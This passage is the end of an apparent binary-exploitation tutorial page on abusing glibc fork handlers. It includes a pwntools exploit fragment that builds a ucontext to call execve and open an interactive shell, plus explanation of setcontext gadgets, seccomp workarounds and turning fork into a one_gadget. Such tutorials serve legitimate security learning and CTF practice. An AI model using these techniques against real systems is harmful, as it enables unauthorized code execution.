plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdx&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execve</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsp&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">unsafe_state</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">unsafe_state</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">randtbl</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># TYPE_0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> ucontext</span><span class="token punctuation" style="color:#393A34">[</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> extra_data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="return-of-the-seccomp">Return of the seccomp<a href="#return-of-the-seccomp" class="hash-link" aria-label="Direct link to Return of the seccomp" title="Direct link to Return of the seccomp">​</a></h3>
<figure><img src="/assets/91d52t.jpg" alt=""><figcaption></figcaption></figure>
<p>This time our work is actually mostly done for us, because <code>2.27</code> and prior, <code>setcontext</code> doesn&#x27;t use <code>rdx</code> for the <code>ucontext</code>.</p>
<figure><img src="/assets/image (107).png" alt=""><figcaption><p><code>setcontext</code> after <code>sigprocmask</code></p></figcaption></figure>
<p>So it&#x27;s just as simple as jumping to <code>setcontext+37</code> (or later).</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-arguments-to-handlers">Detecting arguments to handlers<a href="#detecting-arguments-to-handlers" class="hash-link" aria-label="Direct link to Detecting arguments to handlers" title="Direct link to Detecting arguments to handlers">​</a></h2>
<p>It can be quite cumbersome to check the disassembly to see what the arguments are going to be ahead of time. That&#x27;s why I wrote a script, just like with <a href="/pwn/pwn/rop-2.34+/ret2gets#detecting-this-behaviour">ret2gets</a>, which will trace <code>fork</code> with <code>angr</code>, and log what the arguments to each call to <code>prepare_handler</code> were.</p>
<script src="https://gist.github.com/sasha-999/4feff0af21c4d028fd5701e8f11f12c0.js"></script>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fork---one_gadget">fork -&gt; one_gadget<a href="#fork---one_gadget" class="hash-link" aria-label="Direct link to fork -&gt; one_gadget" title="Direct link to fork -&gt; one_gadget">​</a></h2>
<p>So why would we care about this? I mean sure, we can control <code>fork</code> to either execute <code>system</code> for a shell, or <code>setcontext</code> for ROP/shellcode, but that&#x27;s only useful is there are calls to <code>fork</code>. Not all applications will use <code>fork</code> after all.</p>
<p>What about functions in glibc? Surely some of them will use <code>fork</code>, after all there&#x27;s functions like <code>system</code> which would create a new process to execute a shell command, right?</p>
<p>Well unfortunately not many glibc functions use <code>__libc_fork</code>.</p>
<figure><img src="/assets/image (108).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/A/ident/__fork">Uses of __fork</a></p></figcaption></figure>
<ul>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/login/forkpty.c#L34" target="_blank" rel="noopener noreferrer">forkpty</a></li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/grantpt.c#L207" target="_blank" rel="noopener noreferrer">grantpt</a></li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/misc/daemon.c#L48" target="_blank" rel="noopener noreferrer">daemon</a></li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/oldiopopen.c#L91" target="_blank" rel="noopener noreferrer">_IO_old_popen</a> (not used)</li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/vfork.c#L26" target="_blank" rel="noopener noreferrer">vfork</a> (if the <code>vfork</code> syscall doesn&#x27;t exist)</li>
</ul>
<p>The rest, like <code>system</code> or <code>popen</code> will use an inlined <code>clone</code> call.</p>
<figure><img src="/assets/image (112).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/spawni.c#L415">__spawnix</a>: Used by <code>system</code></p></figcaption></figure>
<p>Well, like I mentioned in the beginning, by overwriting <code>fork_handlers</code>, we effectively have turned <code>fork</code> into a <code>one_gadget</code>. However, this has a few benefits over a regular <code>one_gadget</code>:</p>
<ul>
<li>No constraints.</li>
<li>Can trigger ROP.</li>
</ul>
<p>So if you have a function call primitive, and don&#x27;t have strong argument control, but can use an arbitrary write, this may be useful.</p>
<p>However, a lot of what&#x27;s been done here can also be done with <code>exit</code>, and easier as well, as that has explicit argument control, the only downside there is that you have to deal with pointer mangling too.</p>
<p>In conclusion, there may be some cases where this can be useful, but even if this is never used, I still think it was interesting, and I hope you did too :)</p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/pwn/pwn/setcontext"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">setcontext</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/pwn/category/ctf-writeups"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">CTF writeups</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#cheatsheet" class="table-of-contents__link toc-highlight">Cheatsheet</a></li><li><a href="#what-are-the-fork-handlers" class="table-of-contents__link toc-highlight">What are the fork handlers?</a></li><li><a href="#228-235" class="table-of-contents__link toc-highlight">2.28-2.35</a><ul><li><a href="#so-what" class="table-of-contents__link toc-highlight">So what?</a></li><li><a href="#why-does-this-happen" class="table-of-contents__link toc-highlight">Why does this happen?</a></li><li><a href="#exploitation" class="table-of-contents__link toc-highlight">Exploitation</a></li><li><a href="#is-that-all-we-can-do" class="table-of-contents__link toc-highlight">Is that all we can do?</a></li><li><a href="#gets" class="table-of-contents__link toc-highlight">gets</a></li><li><a href="#seccomp-strikes-back" class="table-of-contents__link toc-highlight">Seccomp strikes back!</a></li><li><a href="#228-229" class="table-of-contents__link toc-highlight">2.28-2.29</a></li></ul></li><li><a href="#236" class="table-of-contents__link toc-highlight">2.36+</a><ul><li><a href="#revenge-of-the-seccomp" class="table-of-contents__link toc-highlight">Revenge of the seccomp!</a></li></ul></li><li><a href="#227-and-prior" class="table-of-contents__link toc-highlight">2.27 and prior</a><ul><li><a href="#ret2rand" class="table-of-contents__link toc-highlight">ret2rand</a></li><li><a href="#return-of-the-seccomp" class="table-of-contents__link toc-highlight">Return of the seccomp</a></li></ul></li><li><a href="#detecting-arguments-to-handlers" class="table-of-contents__link toc-highlight">Detecting arguments to handlers</a></li><li><a href="#fork---one_gadget" class="table-of-contents__link toc-highlight">fork -&gt; one_gadget</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/pwn/">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>